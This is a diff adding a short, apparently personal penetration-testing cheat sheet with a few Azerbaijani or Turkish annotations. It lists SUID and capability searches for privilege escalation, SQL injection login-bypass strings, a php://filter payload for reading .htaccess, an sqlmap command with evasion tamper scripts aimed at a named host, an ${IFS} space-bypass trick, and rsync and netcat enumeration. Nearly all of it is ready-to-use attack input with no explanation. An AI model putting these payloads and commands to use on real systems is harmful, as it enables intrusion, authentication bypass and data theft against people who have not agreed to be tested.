@@ -1,0 +1,42 @@
+find / -perm /4000 2>/dev/null
+strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+getcap -r / 2>/dev/null
+89 50 4E 47 0D 0A 1A 0A
+-oHostKeyAlgorithms=+ssh-rsa
+ss -tuln  
+netstat -tulpn
+--break-system-packages
+
+admin' or 1=1 -- -
+admin' || '1'='1';-- -
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+
+php://filter/convert.base64-encode/resource=.htaccess
+
+sqlmap -u "http://tritonsite.hv/vuln/sqli/?id=1&Submit=Submit#" \
+       --random-agent \
+       --technique=B \
+       --tamper=charencode,space2comment,randomcase,apostrophemask \
+       --delay=3 \
+       --threads=3 \
+       --no-cast \
+       --no-cast \
+       -D vuln \
+       --tables \
+       --batch
+${IFS} ---> bosluq
+
+rsync:
+nc -nv <ip> 873
+rsync -av --list-only rsync://<ip>
+
+rsync <ip>::
+rsync <ip>::<dir> 
+rsync <ip>::<dir> . (ozune cekir)
